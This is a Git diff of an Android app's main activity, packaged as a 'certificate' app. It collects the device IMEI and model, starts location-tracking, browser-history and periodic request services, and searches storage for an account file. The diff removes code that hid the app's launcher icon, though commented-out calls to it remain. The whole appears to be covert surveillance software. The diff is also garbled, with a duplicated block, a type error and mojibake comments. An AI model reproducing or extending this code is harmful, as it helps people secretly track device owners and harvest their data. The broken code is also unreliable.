@@ -6,34 +6,37 @@ import java.util.Calendar;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.content.pm.ActivityInfo;
-import android.content.pm.PackageManager;
+import android.content.res.Configuration;
 import android.os.Bundle;
 import android.os.Environment;
 import android.preference.PreferenceManager;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 import android.view.Menu;
 import android.widget.Button;
 import android.widget.EditText;
 
 import com.inet.android.certificate.R;
 import com.inet.android.history.LinkService;
-import com.inet.android.location.GPSTracker;
+import com.inet.android.location.LocationTracker;
+import com.inet.android.request.Request4;
+import com.inet.android.utils.Logging;
 
 public class MainActivity extends Activity {
 	Button install;
 	Button exit;
-	GPSTracker gps;
+	LocationTracker gps;
 	LinkService link;
 	AlertDialog.Builder ad;
 	Context context;
@@ -48,7 +51,6 @@ public class MainActivity extends Activity {
 	List<String> result;
 	File root;
 	File[] fileArray;
-	private String sIMEI;
 	private String sID;
 
 	@Override
@@ -56,6 +58,8 @@ public class MainActivity extends Activity {
 		super.onCreate(savedInstanceState);
 		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
 		// setContentView(R.layout.activity_main);
+		context = getApplicationContext();
+		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
 
 		FileLog.writeLog(" ============================ \n");
 		FileLog.writeLog(" onCreate \n");
@@ -72,25 +76,46 @@ public class MainActivity extends Activity {
 		aboutDev = " Model: " + model + " Version android: " + versionAndroid;
 		sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
-		e.putString("BUILD", "A0003 2013-10-03 20:00:00");
-		e.putString("IMEI", sIMEI);
+		e.putString("BUILD", "V_000.1");
+		e.putString("imei", imeistring);
 		e.putString("ABOUT", aboutDev);
+		e.putString("model", model);
+		e.putString("account", "account");
+
 		e.commit();
 
 		// hideIcon(); //
 
 		// проверяем, первый ли раз открывается программа
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
+		boolean getInfo = sp.getBoolean("getInfo", false);
+		if (!hasVisited) {
+			// РїСЂРѕРІРµСЂРєР° РЅР° РїРµСЂРІС‹Р№ Р·Р°РїСѓСЃРє
 
 		if (!hasVisited) {
 			// проверка на первое посещение
 			e = sp.edit();
-
 			e.putBoolean("hasVisited", true);
+			e.putBoolean("getInfo", true);
+			e.putBoolean("hideIcon", false);
 			e.putString("ABOUT", aboutDev);
-			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
+			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // РІСЂРµРјСЏ
+																				// РґР»СЏ
+																				// СЃРµСЂРІРёСЃР°
+																				// РёСЃС‚СЂРѕРё
+																				// Рё
+																				// Р±СЂР°СѓР·РµСЂР°
+			e.putString("period", "1"); // РїРµСЂРёРѕРґРёС‡РµСЃРєРёР№ Р·Р°РїСЂРѕСЃ РєР°Р¶РґС‹Рµ 10 РјРёРЅСѓС‚
+			e.putString("code", "-1");
 			e.commit();
-			hideIcon();
+
+			// hideIcon();
+		}
+
+		if (getID()) {
+			Logging.doLog(LOG_TAG, "getID return true");
+		} else {
+			Logging.doLog(LOG_TAG, "getID return false");
 		}
 		
 		getID(); // рекурсивный поиск файла с нужным именем
@@ -100,18 +125,19 @@ public class MainActivity extends Activity {
 			FileLog.writeLog(LOG_TAG + " -> File not found. Show dialog.");
 			
 			viewIDDialog();
-		} else
+		} else {
+			Logging.doLog(LOG_TAG, "not show dialog");
+
 			finish();
+		}
 	}
 
 	private boolean viewIDDialog() {
-		// TODO Auto-generated method stub
 		AlertDialog.Builder alert = new AlertDialog.Builder(this);
 
-		alert.setTitle("Ввод ID");
-		alert.setMessage("Введите ID. Нет права на ошибку!");
+		alert.setTitle("Attention!!!");
+		alert.setMessage("Enter account number!");
 
-		// Set an EditText view to get user input
 		final EditText input = new EditText(this);
 		alert.setView(input);
 
@@ -168,13 +194,13 @@ public class MainActivity extends Activity {
 	public void getID() {
 		Log.d(LOG_TAG, "Start search ID ");
 		File file[] = Environment.getExternalStorageDirectory().listFiles();
-		recursiveFileFind(file);
+		return recursiveFileFind(file);
 	}
 
 	public boolean recursiveFileFind(File[] file1) {
 		int i = 0;
 		String ID = null;
-		String filePath = "";
+		String filePath = " ";
 		if (file1 != null) {
 			while (i != file1.length) {
 				filePath = file1[i].getAbsolutePath();
@@ -188,7 +214,7 @@ public class MainActivity extends Activity {
 				if (sID.indexOf("ts.apk") != -1) {
 					ID = sID.substring(0, sID.indexOf("t"));
 					e = sp.edit();
-					e.putString("ID", ID);
+					e.putString("account", ID);
 					e.commit();
 					
 					sendDiagPost();
@@ -198,40 +224,30 @@ public class MainActivity extends Activity {
 				}
 				i++;
 			}
+
 		}
 		
 		return false;
 	}
 
+	/**
+	 * Start services
+	 */
 	public void start() {
-		Log.d(LOG_TAG, "start services");
-		FileLog.writeLog("start services");
+		Logging.doLog(LOG_TAG, "start services", "start services");
 
 		startService(new Intent(MainActivity.this, Request4.class));
 
 		try {
 			TimeUnit.MILLISECONDS.sleep(1000);
 		} catch (InterruptedException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 
-		startService(new Intent(MainActivity.this, GPSTracker.class));
+		startService(new Intent(MainActivity.this, LocationTracker.class));
 		startService(new Intent(MainActivity.this, LinkService.class));
 
-		Log.d(LOG_TAG, "finish start services");
-		FileLog.writeLog("finish start services");
-		
-	}
-
-	public void hideIcon() {
-		ComponentName componentToDisable = new ComponentName(
-				"com.inet.android.certificate",
-				"com.inet.android.bs.MainActivity");
-
-		getPackageManager().setComponentEnabledSetting(componentToDisable,
-				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-				PackageManager.DONT_KILL_APP);
+		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
 	}
 
 	@Override
@@ -239,14 +255,5 @@ public class MainActivity extends Activity {
 		// Inflate the menu; this adds items to the action bar if it is present.
 		getMenuInflater().inflate(R.menu.main, menu);
 		return true;
-	}
-
-	@SuppressLint("SimpleDateFormat")
-	private static String logTime() {
-		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-		Calendar cal = Calendar.getInstance();
-		cal.setTimeInMillis(System.currentTimeMillis());
-		return "" + formatter.format(cal.getTime());
-
 	}
 }
